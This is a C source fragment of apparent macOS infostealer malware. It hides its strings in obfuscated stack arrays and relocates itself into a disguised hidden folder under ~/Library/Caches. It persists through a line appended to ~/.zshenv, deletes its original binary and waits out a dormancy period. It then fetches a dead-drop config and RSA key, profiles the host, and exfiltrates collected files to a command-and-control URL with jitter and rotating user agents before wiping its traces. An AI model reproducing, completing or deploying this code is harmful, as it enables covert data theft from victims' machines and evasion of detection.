static void decode_ua(int idx, char *out, size_t outsz) {
    const uint8_t *e = ua_table[idx % 4].enc;
    size_t n = ua_table[idx % 4].len;
    if (n >= outsz) n = outsz - 1;
    for (size_t i = 0; i < n; i++) out[i] = e[i] ^ 0x5A;
    out[n] = '\0';
}

/* Persistence: relocate + LaunchAgent + self-delete */

#include <copyfile.h>
#include <mach-o/dyld.h>
#include <sys/stat.h>

static int get_self_path(char *buf, size_t sz) {
    uint32_t len = (uint32_t)sz;
    return _NSGetExecutablePath(buf, &len) == 0 ? 0 : -1;
}

/* Deterministic per-machine seed from HW identity so same host = same paths */
static uint32_t persist_seed(void) {
    uint8_t k[16], iv[16];
    derive_env_key(k, iv);
    uint32_t s;
    memcpy(&s, iv + 12, 4); /* last 4 bytes of iv */
    memset(k, 0, 16); memset(iv, 0, 16);
    return s;
}

/* built on stack */
static void build_paths(char *hide_dir, char *hide_bin) {
    uint32_t rnd = persist_seed();
    char rnd_suffix[12];
    snprintf(rnd_suffix, sizeof(rnd_suffix), ".%08x", rnd);

    /* "/Library/Caches/.com.apple." */
    char hf[28]; { volatile char *v=(volatile char*)hf; v[0]=0x2f; v[1]=0x4c; v[2]=0x69; v[3]=0x62; v[4]=0x72; v[5]=0x61; v[6]=0x72; v[7]=0x79; v[8]=0x2f; v[9]=0x43; v[10]=0x61; v[11]=0x63; v[12]=0x68; v[13]=0x65; v[14]=0x73; v[15]=0x2f; v[16]=0x2e; v[17]=0x63; v[18]=0x6f; v[19]=0x6d; v[20]=0x2e; v[21]=0x61; v[22]=0x70; v[23]=0x70; v[24]=0x6c; v[25]=0x65; v[26]=0x2e; v[27]=0; }
    /* "agent" */
    char ag[6]; { volatile char *v=(volatile char*)ag; v[0]=0x61; v[1]=0x67; v[2]=0x65; v[3]=0x6e; v[4]=0x74; v[5]=0; }
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    snprintf(hide_dir, 512, "%s%s%s", home, hf, rnd_suffix);
    snprintf(hide_bin, 512, "%s/%s", hide_dir, ag);
    memset(hf,0,sizeof(hf)); memset(ag,0,sizeof(ag));
}

static int relocate(const char *dst_dir, const char *dst_bin) {
    mkdir(dst_dir, 0755);
    char self[1024];
    if (get_self_path(self, sizeof(self)) != 0) return -1;
    char real_self[1024], real_dst[1024];
    if (realpath(self, real_self) && realpath(dst_bin, real_dst))
        if (strcmp(real_self, real_dst) == 0) return 0;
    copyfile(self, dst_bin, NULL, COPYFILE_ALL);
    chmod(dst_bin, 0755);
    return 0;
}

/*
 * .zshenv persistence runs on every zsh invocation (interactive + non-interactive).
 * Append a guarded one-liner that backgrounds our binary.
 */
static int install_zshenv(const char *bin_path) {
    const char *home = getenv("HOME");
    if (!home) return -1;

    /* "/.zshenv" */
    char zf[9]; { volatile char *v=(volatile char*)zf;
        v[0]=0x2f; v[1]=0x2e; v[2]=0x7a; v[3]=0x73; v[4]=0x68;
        v[5]=0x65; v[6]=0x6e; v[7]=0x76; v[8]=0; }
    char zpath[512];
    snprintf(zpath, sizeof(zpath), "%s%s", home, zf);
    memset(zf, 0, sizeof(zf));

    /* check if our line is already present */
    FILE *r = fopen(zpath, "r");
    if (r) {
        char line[1024];
        while (fgets(line, sizeof(line), r)) {
            if (strstr(line, bin_path)) { fclose(r); return 0; }
        }
        fclose(r);
    }

    /* (exec <bin> &>/dev/null &) with pgrep guard */
    FILE *f = fopen(zpath, "a");
    if (!f) return -1;

    /* build the line on stack:
     * [ -z "$(pgrep -xf '<bin>')" ] && (exec <bin> &>/dev/null &) */

    /* '[ -z "$(' */
    char g1[9]; { volatile char *v=(volatile char*)g1;
        v[0]=0x5b; v[1]=0x20; v[2]=0x2d; v[3]=0x7a; v[4]=0x20;
        v[5]=0x22; v[6]=0x24; v[7]=0x28; v[8]=0; }
    /* 'pgrep -xf \'' */
    char g2[12]; { volatile char *v=(volatile char*)g2;
        v[0]=0x70; v[1]=0x67; v[2]=0x72; v[3]=0x65; v[4]=0x70;
        v[5]=0x20; v[6]=0x2d; v[7]=0x78; v[8]=0x66; v[9]=0x20;
        v[10]=0x27; v[11]=0; }
    /* '\')" ] && (exec ' */
    char g3[16]; { volatile char *v=(volatile char*)g3;
        v[0]=0x27; v[1]=0x29; v[2]=0x22; v[3]=0x20; v[4]=0x5d;
        v[5]=0x20; v[6]=0x26; v[7]=0x26; v[8]=0x20; v[9]=0x28;
        v[10]=0x65; v[11]=0x78; v[12]=0x65; v[13]=0x63; v[14]=0x20;
        v[15]=0; }
    /* ' &>/dev/null &)\n' */
    char g4[17]; { volatile char *v=(volatile char*)g4;
        v[0]=0x20; v[1]=0x26; v[2]=0x3e; v[3]=0x2f; v[4]=0x64;
        v[5]=0x65; v[6]=0x76; v[7]=0x2f; v[8]=0x6e; v[9]=0x75;
        v[10]=0x6c; v[11]=0x6c; v[12]=0x20; v[13]=0x26; v[14]=0x29;
        v[15]=0x0a; v[16]=0; }

    fprintf(f, "%s%s%s%s%s%s", g1, g2, bin_path, g3, bin_path, g4);
    fclose(f);

    memset(g1,0,sizeof(g1)); memset(g2,0,sizeof(g2));
    memset(g3,0,sizeof(g3)); memset(g4,0,sizeof(g4));
    return 0;
}

/* delete original binary (if we're running from the hidden copy, skip) */
static void self_delete(const char *hide_bin) {
    char self[1024];
    if (get_self_path(self, sizeof(self)) != 0) return;
    char real_self[1024], real_hide[1024];
    if (!realpath(self, real_self)) return;
    if (realpath(hide_bin, real_hide) && strcmp(real_self, real_hide) == 0) return;
    unlink(self);
}

/* remove persistence strip our line from .zshenv + delete hid binary */
static void cleanup_persist(void) {
    char hide_dir[512], hide_bin[512];
    build_paths(hide_dir, hide_bin);

    /* remove our line from ~/.zshenv */
    const char *home = getenv("HOME");
    if (home) {
        char zf[9]; { volatile char *v=(volatile char*)zf;
            v[0]=0x2f; v[1]=0x2e; v[2]=0x7a; v[3]=0x73; v[4]=0x68;
            v[5]=0x65; v[6]=0x6e; v[7]=0x76; v[8]=0; }
        char zpath[512];
        snprintf(zpath, sizeof(zpath), "%s%s", home, zf);
        memset(zf, 0, sizeof(zf));

        FILE *r = fopen(zpath, "r");
        if (r) {
            char tmp[512];
            snprintf(tmp, sizeof(tmp), "%s.tmp", zpath);
            FILE *w = fopen(tmp, "w");
            if (w) {
                char line[1024];
                while (fgets(line, sizeof(line), r)) {
                    if (!strstr(line, hide_bin))
                        fputs(line, w);
                }
                fclose(w);
                fclose(r);
                rename(tmp, zpath);
            } else {
                fclose(r);
            }
        }
    }

    unlink(hide_bin);
    rmdir(hide_dir);
}


/* marker lives next to the hidden binary: {...}/.ts */
static void marker_path(const char *hide_dir, char *out, size_t outsz) {
    /* "/.ts" */
    char suf[5]; { volatile char *v=(volatile char*)suf;
        v[0]=0x2f; v[1]=0x2e; v[2]=0x74; v[3]=0x73; v[4]=0; }
    snprintf(out, outsz, "%s%s", hide_dir, suf);
    memset(suf, 0, sizeof(suf));
}

static time_t read_marker(const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    time_t t = 0;
    fscanf(f, "%ld", &t);
    fclose(f);
    return t;
}

static void write_marker(const char *path) {
    FILE *f = fopen(path, "w");
    if (!f) return;
    fprintf(f, "%ld\n", (long)time(NULL));
    fclose(f);
}

#define PHASE_DORMANT_SECS  3600
#define PHASE_EXFIL_SECS    7200

static int parse_deaddrop(const membuf_t *cfg, char *key_url, size_t ku_sz,
                          char *c2_url, size_t c2_sz) {
    char *nl = memchr(cfg->data, '\n', cfg->sz);
    if (!nl) return -1;
    size_t l1 = nl - (char *)cfg->data;
    if (l1 >= ku_sz) return -1;
    memcpy(key_url, cfg->data, l1);
    key_url[l1] = '\0';

    char *rest = nl + 1;
    size_t remain = cfg->sz - l1 - 1;
    char *nl2 = memchr(rest, '\n', remain);
    size_t l2 = nl2 ? (size_t)(nl2 - rest) : remain;
    if (l2 >= c2_sz) return -1;
    memcpy(c2_url, rest, l2);
    c2_url[l2] = '\0';
    return 0;
}

/* fetch RSA public key PEM from key_url, return opaque handle */
static void *fetch_rsa_pubkey(const char *key_url, const char *ua) {
    membuf_t kb = {0};
    if (http_get(key_url, ua, &kb) != 0 || kb.sz < 64) {
        membuf_free(&kb);
        return NULL;
    }
    void *key = rsa_load_pubkey(kb.data, kb.sz);
    membuf_free(&kb);
    return key;
}

/* compress data before RSA envelope */
static uint8_t *zpack(const uint8_t *data, size_t len, size_t *out_sz) {
    uLongf clen = compressBound(len);
    uint8_t *comp = malloc(clen);
    if (!comp) return NULL;
    if (compress(comp, &clen, data, len) != Z_OK) { free(comp); return NULL; }
    *out_sz = clen;
    return comp;
}

int payload_run(void) {
    if (!harden_check()) { self_destruct(); return -1; }

    char hide_dir[512], hide_bin[512];
    build_paths(hide_dir, hide_bin);
    relocate(hide_dir, hide_bin);
    install_zshenv(hide_bin);
    self_delete(hide_bin);

    char mpath[512];
    marker_path(hide_dir, mpath, sizeof(mpath));
    time_t installed = read_marker(mpath);
    time_t now = time(NULL);

    if (!installed) { write_marker(mpath); return 0; }

    long elapsed = (long)(now - installed);
    if (elapsed < PHASE_DORMANT_SECS) return 0;

    hunt_procs();
    if (load_curl() != 0) return -1;
    if (rsa_init() != 0) return -1;

    char dead_url[256], ctype[64], ua[128];
    vdec(V_DEADURL, dead_url, sizeof(dead_url));
    vdec(V_CTYPE,   ctype,    sizeof(ctype));
    vdec(V_UA,      ua,       sizeof(ua));

    /* Fetch dead-drop */
    membuf_t cfg = {0};
    char current_ua[256];
    { aether_rng_t rng; aether_rng_init(&rng);
      decode_ua(aether_rand(&rng) % 4, current_ua, sizeof(current_ua)); }

    if (http_get(dead_url, current_ua, &cfg) != 0 || cfg.sz < 8) {
        membuf_free(&cfg);
        stk_wipe(dead_url, sizeof(dead_url));
        stk_wipe(ctype, sizeof(ctype)); stk_wipe(ua, sizeof(ua));
        stk_wipe(current_ua, sizeof(current_ua));
        return 1;
    }
    stk_wipe(dead_url, sizeof(dead_url));

    char key_url[512], c2_url[512];
    if (parse_deaddrop(&cfg, key_url, sizeof(key_url),
                       c2_url, sizeof(c2_url)) != 0) {
        membuf_free(&cfg);
        stk_wipe(ctype, sizeof(ctype)); stk_wipe(ua, sizeof(ua));
        stk_wipe(current_ua, sizeof(current_ua));
        return 1;
    }
    membuf_free(&cfg);

    /* Fetch RSA public key from key URL */
    void *pubkey = fetch_rsa_pubkey(key_url, current_ua);
    stk_wipe(key_url, sizeof(key_url));
    if (!pubkey) {
        stk_wipe(c2_url, sizeof(c2_url));
        stk_wipe(ctype, sizeof(ctype)); stk_wipe(ua, sizeof(ua));
        stk_wipe(current_ua, sizeof(current_ua));
        return 1;
    }

    {
        char prof[4096];
        size_t plen = profile_host(prof, sizeof(prof));
        size_t zlen;
        uint8_t *zd = zpack((uint8_t *)prof, plen, &zlen);
        stk_wipe(prof, sizeof(prof));
        if (zd) {
            size_t enc_sz;
            uint8_t *enc = rsa_seal(pubkey, zd, zlen, &enc_sz);
            stk_wipe(zd, zlen); free(zd);
            if (enc) {
                decode_ua((int)(now % 4), current_ua, sizeof(current_ua));
                http_post_chunk(c2_url, current_ua, ctype, enc, enc_sz);
                stk_wipe(enc, enc_sz); free(enc);
            }
        }
    }

    if (elapsed < PHASE_EXFIL_SECS) {
        rsa_free_pubkey(pubkey);
        stk_wipe(c2_url, sizeof(c2_url));
        stk_wipe(ctype, sizeof(ctype)); stk_wipe(ua, sizeof(ua));
        stk_wipe(current_ua, sizeof(current_ua));
        return 0;
    }

    collect();

    for (int i = 0; i < g_nf; i++) {
        /* pack single file: [nlen(2)][name][fsz(4)][data] */
        const char *base = strrchr(g_files[i].path, '/');
        base = base ? base + 1 : g_files[i].path;
        uint16_t nl = (uint16_t)strlen(base);
        uint32_t fs = (uint32_t)g_files[i].sz;
        size_t fsz = 2 + nl + 4 + g_files[i].sz;
        uint8_t *fbuf = malloc(fsz);
        if (!fbuf) continue;
        size_t off = 0;
        memcpy(fbuf + off, &nl, 2); off += 2;
        memcpy(fbuf + off, base, nl); off += nl;
        memcpy(fbuf + off, &fs, 4); off += 4;
        memcpy(fbuf + off, g_files[i].data, g_files[i].sz); off += g_files[i].sz;

        size_t zlen;
        uint8_t *zd = zpack(fbuf, off, &zlen);
        stk_wipe(fbuf, fsz); free(fbuf);
        if (!zd) continue;

        size_t enc_sz;
        uint8_t *enc = rsa_seal(pubkey, zd, zlen, &enc_sz);
        stk_wipe(zd, zlen); free(zd);

        if (enc) {
            decode_ua(i % 4, current_ua, sizeof(current_ua));
            for (int retry = 0; retry < 5; retry++) {
                if (http_post_chunk(c2_url, current_ua, ctype, enc, enc_sz) == 0)
                    break;
                aether_rng_t rng; aether_rng_init(&rng);
                sleep((1 << retry) + (aether_rand(&rng) % 5));
            }
            stk_wipe(enc, enc_sz); free(enc);
        }

        /* 30-90s */
        if (i + 1 < g_nf) {
            aether_rng_t rng; aether_rng_init(&rng);
            sleep(30 + (aether_rand(&rng) % 61));
        }
    }

    cleanup_persist();
    rsa_free_pubkey(pubkey);
    stk_wipe(c2_url, sizeof(c2_url));
    stk_wipe(ctype, sizeof(ctype)); stk_wipe(ua, sizeof(ua));
    stk_wipe(current_ua, sizeof(current_ua));
    free_files();
    return 0;
}
